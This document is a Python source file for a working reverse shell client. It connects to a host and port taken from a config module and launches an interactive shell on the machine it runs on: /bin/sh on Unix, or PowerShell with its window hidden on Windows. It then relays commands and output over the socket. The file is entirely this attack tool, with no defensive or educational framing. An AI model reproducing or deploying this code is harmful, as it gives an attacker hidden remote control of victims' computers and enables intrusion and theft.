import sys
import socket
import threading
import subprocess
from typing import Union, Sequence

import config


def stdin(sock: socket.socket, process: subprocess.Popen):
    while process.poll() is None:
        try:
            # even tho the commands are limited at 4096 per
            # received buffer the command will not execute
            # until the "\n" byte is received which means each
            # command will be executed without loss of input
            command = sock.recv(4096)
            if command == b"exit\n":
                process.kill()
                return
            else:
                process.stdin.write(command)
                process.stdin.flush()
        except OSError:
            process.kill()


def stdout(sock: socket.socket, process: subprocess.Popen):
    try:
        # as long as the process is running send all stdout
        # by reading 1 byte at a time since if the stdout
        # buffer does not match the lenght you read it will
        # wait until the buffer matches the read size or is
        # above, resulting in delayed output buffering.
        while process.poll() is None:
            sock.send(process.stdout.read(1))
    except OSError:
        process.kill()


def create_process(shell_interface: Union[str, Sequence[str]]) -> subprocess:
    # redirect stderr to the stdout pipe to minimize
    # required threads for sending output to server
    process = subprocess.Popen(
        shell_interface,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )

    return process


def main(ip: str, port: int) -> None:
    # create socket object and connect to 
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))

    if sys.platform == "win32":
        # shell inteface for windows systems
        shell = ["powershell", "-w", "1"]
    else:
        # generic shell interface for unix based systems
        shell = ["/bin/sh", "-i"]

    # create an interactive shell subprocess
    process = create_process(shell)

    # start stdin as a non-daemon thread to ensure the
    # program does stop after the main thread finish
    stdin_thread = threading.Thread(target=stdin, args=(sock, process))

    # due to an how the python high level subprocess pipe
    # streams works will the stdout freeze in cases cancelled
    # process output. By making this thread daemon it will
    # avoid freezing and terminate after the stdin_thread stops
    stdout_thread = threading.Thread(target=stdout, args=(sock, process), daemon=True)

    # start threads
    stdin_thread.start()
    stdout_thread.start()


if __name__ == "__main__":
    main(config.IP, config.PORT)